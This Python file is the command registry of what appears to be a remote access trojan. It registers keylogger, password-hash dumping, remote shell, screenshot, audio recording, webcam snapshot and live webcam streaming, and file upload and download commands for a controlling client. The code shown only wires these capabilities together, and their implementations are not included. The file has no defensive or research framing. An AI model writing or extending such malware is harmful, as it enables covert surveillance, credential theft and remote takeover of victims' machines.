from .help import HelpCommand
from .download import DownloadCommand
from .ipconfig import IPConfigCommand
from .keylogger import KeyloggerCommand
from .upload import UploadCommand
from .screenshot import ScreenshotCommand
from .search import SearchCommand
from .hashdump import HashdumpCommand
from .shell import ShellCommand
from .record_audio import AudioRecordCommand
from .webcam_snapshot import WebcamSnapshotCommand
from .webcam_stream import WebcamStreamCommand


class CommandRegistry:
    def __init__(self, client):
        self.client = client
        self.commands = {}

        self.register(HelpCommand())
        self.register(DownloadCommand())
        self.register(IPConfigCommand())
        self.register(KeyloggerCommand())
        self.register(UploadCommand())
        self.register(ScreenshotCommand())
        self.register(SearchCommand())
        self.register(HashdumpCommand())
        self.register(ShellCommand())
        self.register(AudioRecordCommand())
        self.register(WebcamSnapshotCommand())
        self.register(WebcamStreamCommand(client))

    def register(self, command):
        self.commands[command.name] = command

    def get(self, name):
        return self.commands.get(name)
